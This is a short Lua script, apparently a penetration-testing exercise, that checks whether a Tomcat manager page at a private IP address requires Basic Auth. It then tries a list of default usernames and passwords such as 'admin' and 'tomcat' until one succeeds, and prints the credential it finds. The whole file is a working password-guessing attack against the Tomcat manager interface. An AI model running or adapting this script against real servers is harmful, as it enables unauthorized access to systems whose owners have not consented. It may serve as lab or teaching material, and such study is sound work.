usernames = {"admin","manager","tomcat"}
passwords = {"admin","manager","tomcat","password"}

status,basic,err = http.head("10.0.1.20",8080,"/manager/html")
if err ~= "" then
    print("[!] Error: "..err)
    return
end
if status ~= 401 or not basic then
    print("[!] Error: Endpoint dose not require Basic Auth. Exting.")
    return
end
print("[+] Endpoint requires Basic Auth. Proceeding with password gussing")
for i, username in ipairs(usernames) do
    for j, password in ipairs(passwords) do
        status,basic,err =http.get("10.0.1.20",8080,username,password,"/manager/html")
        if status == 200 then
            print("[+] Found cred - "..username..":"..password)
            return
        end
    end
end